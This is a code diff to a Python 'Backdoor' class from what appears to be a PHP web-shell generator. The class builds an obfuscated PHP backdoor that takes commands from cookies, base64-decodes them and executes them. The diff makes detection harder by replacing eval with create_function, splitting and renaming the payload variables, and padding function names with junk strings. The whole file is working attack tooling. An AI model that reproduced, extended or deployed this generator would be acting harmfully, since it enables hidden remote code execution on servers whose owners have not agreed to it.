@@ -22,21 +22,6 @@ from pollution import random_string, pollute_with_static_str
 
 class Backdoor:
 
-#	payload_template= """
-#$c='count';
-#$a=$_COOKIE;
-#if(reset($a)=='%%%START_KEY%%%' && $c($a)>3){
-#ini_set('error_log', '/dev/null');
-#$k='%%%END_KEY%%%';
-#echo '<'.$k.'DEBUG>';
-#print(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
-#echo '</'.$k.'DEBUG>';
-#echo '<'.$k.'>';
-#eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
-#echo '</'.$k.'>';
-#}
-#"""
-
 	payload_template= """
 $c='count';
 $a=$_COOKIE;
@@ -50,16 +35,17 @@ echo '</'.$k.'>';
 """
 
 	backdoor_template = """<?php 
-$%%PAY_VAR%%1="%%PAYLOAD1%%";
-$%%PAY_VAR%%2="%%PAYLOAD2%%";
-$%%PAY_VAR%%3="%%PAYLOAD3%%";
-$%%PAY_VAR%%4="%%PAYLOAD4%%";
+$%%PAY_VAR1%%="%%PAYLOAD1%%";
+$%%PAY_VAR2%%="%%PAYLOAD2%%";
+$%%PAY_VAR3%%="%%PAYLOAD3%%";
+$%%PAY_VAR4%%="%%PAYLOAD4%%";
 $%%B64_FUNC%% = "%%B64_ENCODED%%";
 $%%REPL_FUNC%% = "str_replace";
 $%%B64_FUNC%% = $%%REPL_FUNC%%("%%B64_POLLUTION%%", "", $%%B64_FUNC%%);
-eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%PAY_VAR%%2.$%%PAY_VAR%%3.$%%PAY_VAR%%4))); 
-?>
-"""
+$%%CREATFUNC%% = $%%REPL_FUNC%%("%%CREATFUNC_POLLUTION%%","","%%CREATFUNC_ENCODED%%");
+$%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR1%%.$%%PAY_VAR2%%.$%%PAY_VAR3%%.$%%PAY_VAR4%%))); $%%FINALFUNC%%();
+?>"""
+
 
 	def __init__( self, password ):
 		
@@ -80,11 +66,14 @@ eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%
 		b64_new_func_name = random_string()
 		b64_pollution, b64_polluted = pollute_with_static_str('base64_decode',frequency=0.7)
 		
-		payload_var = random_string()
+		createfunc_name = random_string()
+		createfunc_pollution, createfunc_polluted = pollute_with_static_str('create_function',frequency=0.7)
+		
+		payload_var = [ random_string() for st in range(4) ]
 		payload_pollution, payload_polluted = pollute_with_static_str(base64.b64encode(self.payload))
 		
 		replace_new_func_name = random_string()
-		
+		final_func_name = random_string()
 		
 		length  = len(payload_polluted)
 		offset = 7
@@ -93,14 +82,20 @@ eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%
 		piece3  = length*3/4 + randrange(-offset,+offset)
 		
 		ts_splitted = self.backdoor_template.splitlines()
-		ts_shuffled = ts_splitted[1:-3]
+		ts_shuffled = ts_splitted[1:7]
 		shuffle(ts_shuffled)
-		ts_splitted = [ts_splitted[0]] + ts_shuffled + ts_splitted[-3:]
+		ts_splitted = [ts_splitted[0]] + ts_shuffled + ts_splitted[7:]
 		self.backdoor_template = '\n'.join(ts_splitted)
 		
 		template = self.backdoor_template.replace( '%%B64_ENCODED%%', b64_polluted )
 		template = template.replace( '%%B64_FUNC%%', b64_new_func_name )
-		template = template.replace( '%%PAY_VAR%%', payload_var )
+		template = template.replace( '%%CREATFUNC%%', createfunc_name )
+		template = template.replace( '%%CREATFUNC_ENCODED%%',  createfunc_polluted )
+		template = template.replace( '%%CREATFUNC_POLLUTION%%',  createfunc_pollution )
+		template = template.replace( '%%PAY_VAR1%%', payload_var[0] )
+		template = template.replace( '%%PAY_VAR2%%', payload_var[1] )
+		template = template.replace( '%%PAY_VAR3%%', payload_var[2] )
+		template = template.replace( '%%PAY_VAR4%%', payload_var[3] )
 		template = template.replace( '%%PAYLOAD_POLLUTION%%', payload_pollution )
 		template = template.replace( '%%B64_POLLUTION%%', b64_pollution )
 		template = template.replace( '%%PAYLOAD1%%', payload_polluted[:piece1] )
@@ -110,6 +105,7 @@ eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%
 		
 		
 		template = template.replace( '%%REPL_FUNC%%', replace_new_func_name )
+		template = template.replace( '%%FINALFUNC%%', final_func_name )
 		
 		
 		return template
